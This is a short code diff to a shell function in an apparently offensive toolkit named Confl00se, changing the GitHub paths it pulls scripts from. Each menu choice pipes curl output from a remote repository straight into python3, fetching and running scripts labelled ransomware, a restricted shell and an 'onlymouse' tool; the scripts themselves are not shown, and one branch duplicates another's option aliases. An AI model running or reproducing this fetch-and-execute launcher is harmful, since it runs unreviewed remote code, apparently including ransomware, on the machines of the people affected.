@@ -19,13 +19,13 @@ function gui() {
 function confloose() {
     if [ "$1" == "0" ] || [ "$1" == "ransom" ] || [ "$1" == "-r" ]; then
         # ransomware
-        python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/src/ransom.py")
+        python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/ransom.py")
     elif [ "$1" == "1" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
         # restricted_shell
-        python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/src/restricted_shell.py")
+        python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/restricted_shell.py")
     elif [ "$1" == "2" ] || [ "$1" == "shell" ] || [ "$1" == "-s" ]; then
          # onlymouse
-         python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/src/onlymouse.py")
+         python3 <(curl "https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/onlymouse.py")
     elif [ "$1" == "3" ]; then
         exit
     else
